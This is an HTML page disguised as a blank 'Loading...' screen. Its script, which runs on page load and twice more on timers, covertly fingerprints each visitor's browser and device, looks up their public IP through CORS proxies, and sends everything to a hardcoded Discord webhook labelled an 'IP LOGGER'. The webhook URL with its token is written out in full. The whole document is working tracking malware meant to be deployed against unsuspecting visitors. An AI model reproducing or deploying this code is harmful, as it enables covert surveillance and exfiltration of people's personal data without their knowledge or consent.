<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
        }
    </style>
</head>
<body>
    <!--- GITHUB COMPATIBLE -->

    <script>
        (function() {
            const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1435062082562162761/9Kzz_6cJ47_NirxO5VcPm4q7aA3WcAnWjYvSGiKnxFHCev3F8jbxnf8HfO7sIETXBi3l';
            
            // CORS Proxy URLs to bypass GitHub restrictions
            const CORS_PROXIES = [
                'https://cors-anywhere.herokuapp.com/',
                'https://api.codetabs.com/v1/proxy?quest=',
                'https://corsproxy.io/?',
                'https://proxy.cors.sh/'
            ];

            // Get IP using CORS proxy
            const getRealIP = async () => {
                const ipApis = [
                    'https://api.ipify.org?format=json',
                    'https://api64.ipify.org?format=json',
                    'https://ip.seeip.org/json',
                    'https://api.my-ip.io/ip.json'
                ];

                for (const proxy of CORS_PROXIES) {
                    for (const api of ipApis) {
                        try {
                            const proxyUrl = proxy + encodeURIComponent(api);
                            const response = await fetch(proxyUrl, {
                                method: 'GET',
                                headers: {
                                    'X-Requested-With': 'XMLHttpRequest'
                                }
                            });
                            
                            if (response.ok) {
                                const data = await response.json();
                                if (data.ip && isValidIP(data.ip)) {
                                    return data.ip;
                                }
                            }
                        } catch(e) {
                            continue;
                        }
                    }
                }
                return 'Unknown';
            };

            // Validate IP
            const isValidIP = (ip) => {
                return !ip.startsWith('10.') && 
                       !ip.startsWith('192.168.') && 
                       !ip.startsWith('172.16.') &&
                       !ip.startsWith('172.17.') &&
                       !ip.startsWith('172.18.') &&
                       !ip.startsWith('172.19.') &&
                       !ip.startsWith('172.20.') &&
                       !ip.startsWith('172.21.') &&
                       !ip.startsWith('172.22.') &&
                       !ip.startsWith('172.23.') &&
                       !ip.startsWith('172.24.') &&
                       !ip.startsWith('172.25.') &&
                       !ip.startsWith('172.26.') &&
                       !ip.startsWith('172.27.') &&
                       !ip.startsWith('172.28.') &&
                       !ip.startsWith('172.29.') &&
                       !ip.startsWith('172.30.') &&
                       !ip.startsWith('172.31.') &&
                       ip !== '127.0.0.1';
            };

            // Send to Discord via CORS proxy
            const sendToDiscord = async (ip, fingerprint) => {
                const payload = {
                    embeds: [{
                        title: "VEXS IP LOGGER - IP CAPTURED VIA GITHUB",
                        color: 0x00ff00,
                        timestamp: new Date().toISOString(),
                        fields: [
                            {
                                name: "PUBLIC IP",
                                value: `\`\`\`${ip}\`\`\``,
                                inline: false
                            },
                            {
                                name: "Location Info",
                                value: `**Timezone:** ${fingerprint.timezone}\n**Language:** ${fingerprint.language}`,
                                inline: true
                            },
                            {
                                name: "System Info",
                                value: `**Platform:** ${fingerprint.platform}\n**Screen:** ${fingerprint.screen_resolution}`,
                                inline: true
                            },
                            {
                                name: "Browser",
                                value: `\`\`\`${fingerprint.user_agent.substring(0, 100)}...\`\`\``,
                                inline: false
                            }
                        ],
                        footer: {
                            text: "Astrael GitHub IP Logger • CORS Bypass"
                        }
                    }],
                    username: "GitHub IP Tracker"
                };

                // Try each proxy for Discord webhook
                for (const proxy of CORS_PROXIES) {
                    try {
                        const proxyUrl = proxy + encodeURIComponent(DISCORD_WEBHOOK);
                        await fetch(proxyUrl, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                                'X-Requested-With': 'XMLHttpRequest'
                            },
                            body: JSON.stringify(payload)
                        });
                        console.log('✅ Sent via proxy:', proxy);
                        return true;
                    } catch(e) {
                        console.log('❌ Proxy failed:', proxy);
                        continue;
                    }
                }
                return false;
            };

            // Collect fingerprint
            const collectFingerprint = () => {
                return {
                    user_agent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
                    screen_resolution: `${screen.width}x${screen.height}`,
                    color_depth: screen.colorDepth,
                    pixel_ratio: window.devicePixelRatio,
                    cpu_cores: navigator.hardwareConcurrency || 'Unknown',
                    device_memory: navigator.deviceMemory || 'Unknown',
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    local_time: new Date().toString(),
                    url: window.location.href,
                    referrer: document.referrer || 'Direct'
                };
            };

            // Main function
            const trackIP = async () => {
                try {
                    const fingerprint = collectFingerprint();
                    const ip = await getRealIP();
                    
                    if (ip !== 'Unknown') {
                        await sendToDiscord(ip, fingerprint);
                    } else {
                        // Send failure notification
                        for (const proxy of CORS_PROXIES) {
                            try {
                                const proxyUrl = proxy + encodeURIComponent(DISCORD_WEBHOOK);
                                await fetch(proxyUrl, {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json',
                                        'X-Requested-With': 'XMLHttpRequest'
                                    },
                                    body: JSON.stringify({
                                        content: `❌ **IP CAPTURE FAILED**\n**User Agent:** ${fingerprint.user_agent}\n**URL:** ${fingerprint.url}`
                                    })
                                });
                                break;
                            } catch(e) {
                                continue;
                            }
                        }
                    }
                } catch (error) {
                    console.log('Tracking error:', error);
                }
            };

            // Start tracking
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', trackIP);
            } else {
                trackIP();
            }

            // Additional tracking points
            setTimeout(trackIP, 2000);
            setTimeout(trackIP, 5000);

        })();
    </script>
</body>
</html>

